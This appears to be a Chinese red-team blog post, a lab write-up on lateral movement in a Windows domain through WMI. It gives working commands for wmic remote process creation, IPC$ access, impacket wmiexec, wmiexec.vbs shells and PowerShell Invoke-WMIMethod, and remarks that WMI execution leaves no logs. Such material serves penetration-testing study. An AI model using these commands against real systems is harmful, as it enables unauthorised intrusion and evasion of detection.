\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/2fZpxh4xDCAlnzmyuD3fXg)

渗透攻击红队

一个专注于红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDoZibS8XU01CtEtSbwM3VGr3qskOmA1VkccY0mwKTCq6u2ia1xYRwBn3A/640?wx_fmt=jpeg)

  

  

大家好，这里是 **渗透攻击红队** 的第 **28** 篇文章，本公众号会记录一些我学习红队攻击的复现笔记（由浅到深），不出意外每天一更

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC4T65TNkYZsPg2BJ2VwibZicuBhV9DGqxlsxwG0n2ibhLuBsiamU7S0SqvAp6p33ucxPkuiaDiaKD6ibJGaQ/640?wx_fmt=gif)

WMI

自从 PsExec 在内网中被严格监控后，越来越多的反病毒厂商将 PsExec 加入了黑名单，于是黑客们渐渐开始使用 WMI 进行横向移动。

通过渗透测试发现，在使用 wmiexec 进行横向移动时，windows 操作系统默认不会将 WMI 的操作记录在日志中。因此很多 APT 开始使用 WMI 进行攻击。

**WMI**

**wmic**

* * *

使用目标系统的 cmd.exe 执行一条命令，并将结果保存在 C 盘的 ip.txt 文件中：

```
wmic /node:192.168.3.21 /user:god\\Administrator /password:Admin12345 process call create "cmd.exe /c ipconfig >c:\\ip.txt"
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKnIhcQ1H95PHvfe7PQkfbR0IBd93YdJKZenVmTJhibdial8DzbFJn2jITib01moa3C7s1A4geibiaYbbQ/640?wx_fmt=png)

去到 Windows Server 2008 域管的 C 盘下，可以发现生成的 ip.txt 文件：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKnIhcQ1H95PHvfe7PQkfbRL6Fia3kfXrtAsuObiadF1V5a9x6nCul4RWLBRxvgxwldnkpSu7CfaiaEA/640?wx_fmt=png)

我们可以通过建立 IPC$（2008 域用户 -->2008 域管），使用 type 命令读取执行结果：

```
\# 建立IPC$
net use \\\\192.168.3.21 /u:god\\administrator Admin12345
# type读取结果
type \\\\192.168.3.21\\c$\\ip.txt
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKnIhcQ1H95PHvfe7PQkfbRer28ksNkzjKetkHHPyePmBdxh0ehJGaNnDtHkou9fvDhSkAeWeLS9g/640?wx_fmt=png)

使用 wmic 远程执行命令，在远程系统中启动 Windows Mannagement Instrumentation 服务（目标服务器需要开放 135 端口，wmic 会以管理员权限在远程系统中执行命令）

如果目标服务器开启了防火墙，wmic 将无法进行连接。此外 wmic 命令没有回显，需要使用 ipc$ 和 type 命令来读取信息。

PS：wmic 执行的是一些恶意文件程序，那么将不会留下攻击日志。

* * *

**impacket 工具包的 wmiexec**

下载地址：https://github.com/SecureAuthCorp/impacket

进入 impacket 目录安装依赖：

```
pip install .
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKnIhcQ1H95PHvfe7PQkfbRsrGDcibgqN4yKrQA5dMtM3gIvxJOWT5HKQM3uxkCzl4pxPy1bETt2wQ/640?wx_fmt=png)

进入到 examples 目录运行脚本获取远程目标系统的 shell：

```
python wmiexec.py Administrator:Admin12345@192.168.2.25
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKnIhcQ1H95PHvfe7PQkfbRoc5ObbPhJSQWicSLYI7WT5ZDXz3bb7Dqz8KYE7sJjxznl4naB6znm0A/640?wx_fmt=png)

* * *

**wmiexec.vbs**

wmiexec.vbs 可以在远程系统中执行命令并进行回显，获得远程主机的半交互式 shell：

```
cscript.exe //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKnIhcQ1H95PHvfe7PQkfbRvJDnZFDOoUJzu1XicOo4ib8SrInIvo68287uibFoABOnXgicyJz7jlzGmQ/640?wx_fmt=png)

输入如下命令，使用 wmiexec.vbs 在远程主机上执行单挑命令：  

```
cscript.exe wmiexec.vbs /cmd 192.168.3.21 administrator Admin12345 "ipconfig"
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKnIhcQ1H95PHvfe7PQkfbRWqibRvaJ7BvWcUWVGTVUJcP9NXx2qB9Xt75YVbsHfJDxJ7WfhLL2NNQ/640?wx_fmt=png)

对于一些运行时间比较长的命令，例如 ping、systeminfo，需要添加一个参数：“-wait 5000”，或者更长的时间间隔。

PS：wmiexec.vbs 已经被卡巴斯基，赛门铁克 等杀毒软件列入黑名单了。

* * *

**Invoke-WMIMethod**

利用 PowerShell 自带的 Invoke-WMIMethod，可以在远程系统主机上执行命令和指定程序。

```
#目标系统用户名
$User = "god\\administrator"

#目标系统密码
$Password= ConvertTo-SecureString -String "Admin12345" -AsPlainText -Force

#账号密码整合，导入Credential
$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User , $Password

#远程运行计算器程序
Invoke-WMIMethod -Class Win32\_Process -Name Create -ArgumentList "calc.exe" -ComputerName "192.168.3.21" -Credential $Cred
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKnIhcQ1H95PHvfe7PQkfbRm9qgYTHXroaHstpByGODx4ibFwFkFbSyj16uLSUdiaGCy96DY0Rrsm0A/640?wx_fmt=png)

这个时候远程目标域控机器上就会有一个 calc.exe 的进程：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKnIhcQ1H95PHvfe7PQkfbR7ZYEA2JvLjaEJZqaHoQNlxY0BHlWCwGmor9dYdvbWItcGbZibeqrb1g/640?wx_fmt=png)

* * *

渗透攻击红队 发起了一个读者讨论 快来发表你的评论把！ 精选讨论内容

在黑客的机器上就可以

参考文章：

https://blog.csdn.net/qq\_27446553/article/details/46008473

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

渗透攻击红队

一个专注于渗透红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDdjBqfzUWVgkVA7dFfxUAATDhZQicc1ibtgzSVq7sln6r9kEtTTicvZmcw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDY9HXLCT5WoDFzKP1Dw8FZyt3ecOVF0zSDogBTzgN2wicJlRDygN7bfQ/640?wx_fmt=png)

点分享

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDRwPQ2H3KRtgzicHGD2bGf1Dtqr86B5mspl4gARTicQUaVr6N0rY1GgKQ/640?wx_fmt=png)

点点赞

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDgRo5uRP3s5pLrlJym85cYvUZRJDlqbTXHYVGXEZqD67ia9jNmwbNgxg/640?wx_fmt=png)

点在看